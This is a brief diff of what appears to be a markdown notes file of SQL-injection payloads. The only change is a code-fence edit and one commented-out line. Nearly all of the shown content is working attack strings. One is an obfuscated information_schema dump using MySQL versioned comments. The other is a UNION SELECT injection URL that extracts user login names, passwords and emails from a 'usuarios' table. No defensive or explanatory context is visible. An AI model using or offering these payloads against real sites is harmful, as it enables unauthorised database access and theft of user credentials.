@@ -30,7 +30,7 @@ export_set(5,@:=0,(select+count(*)/*!50000from*/+/*!50000information_schema*/.co
 
 ## Data
 
-````
-usr_login_name,0x3a,usr_pwd,0x3a,usr_email FROM usuarios
+````py
+## usr_login_name,0x3a,usr_pwd,0x3a,usr_email FROM usuarios
 https://www.fz3r0_corps.com/product.php?=-4 UNION SELECT 1,2,(SELECT+GROUP_CONCAT(usr_login_name,0x3a,usr_pwd,0x3a,usr_email+SEPARATOR+0x3c62723e3c62723e)+FROM+usuarios),17 --+-
 ````
